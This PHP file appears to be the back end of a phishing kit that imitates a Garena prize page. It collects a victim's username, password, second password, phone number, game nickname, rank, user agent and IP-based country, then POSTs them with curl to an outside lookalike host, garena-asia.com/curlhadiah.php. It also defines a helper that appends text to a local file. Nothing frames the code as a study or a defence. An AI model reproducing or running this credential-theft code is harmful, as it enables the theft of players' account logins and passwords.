<?php 
$myData = 
"user=".$user.
"&pass=".$pass.
"&hp=".$hp.
"&id=".$id.
"&nick=".$nick.
"&level=".$level.
"&epass=".$epass.
"&rank=".$rank.
"&ua=".$ua.
"&ip=".$ip.
"&op=".$op.
"&cn=".$nguyen->getFlag($ip)['country'].
"&codejem=".$nguyen->getFlag($ip)['code'].
"&flagjem=".$nguyen->getFlag($ip)['flag'].
"&jamasuk=".$jamasuk;
$myUrl  = "https://garena-asia.com/curlhadiah.php";

$c4 = curl_init();
curl_setopt($c4, CURLOPT_URL, $myUrl);
curl_setopt($c4, CURLOPT_POST, 1);
curl_setopt($c4, CURLOPT_POSTFIELDS, $myData);
curl_setopt($c4, CURLOPT_RETURNTRANSFER, 1); 
curl_setopt($c4, CURLOPT_COOKIEJAR, getcwd()."/boyxd.txt");
curl_setopt($c4, CURLOPT_COOKIEFILE, getcwd()."/boyxd.txt");   
curl_setopt($c4, CURLOPT_HEADER, 0);
curl_setopt($c4, CURLOPT_FOLLOWLOCATION, 0);
curl_exec($c4);
curl_close($c4);

function tulis_file($nama, $isi) {
  $click = fopen("$nama","a");
    fwrite($click,"$isi"."\n");
    fclose($click);
}
?>
